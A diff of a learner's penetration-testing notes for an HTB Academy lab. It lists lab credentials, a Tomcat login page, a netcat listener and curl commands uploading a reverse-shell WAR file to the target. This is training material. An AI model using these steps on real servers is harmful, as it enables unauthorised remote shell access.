@@ -2,6 +2,8 @@
 10.129.204.126
 ```
 
+### Host 1
+
 Credentials: htb-student / HTB_@cademy_stdnt!
 
 Host 1: 172.16.1.11:8080
@@ -114,6 +116,18 @@ For blog.inlanefreight.local
 admin:admin123!@#
 ```
 
+#### Tomcat login
+
+**Login Page**
+```
+http://172.16.1.11:8080
+```
+
+#### Netcat worked, Metasploit didnt
+```
+netcat -nlvp 4444
+```
+
 #### Curl Post Request
 ```
 curl --upload-file reverse.war -u 'tomcat:Tomcatadm' "http://status.inlanefreight.local"
@@ -125,14 +139,5 @@ curl -d @reverse2.war http://status.inlanefreight.local/form1
 ```
 
 
-#### Tomcat login
+### Host 2:
 
-**Login Page**
-```
-http://172.16.1.11:8080
-```
-
-**Credentials**
-```
-tomcat:Tomcatadm
-```
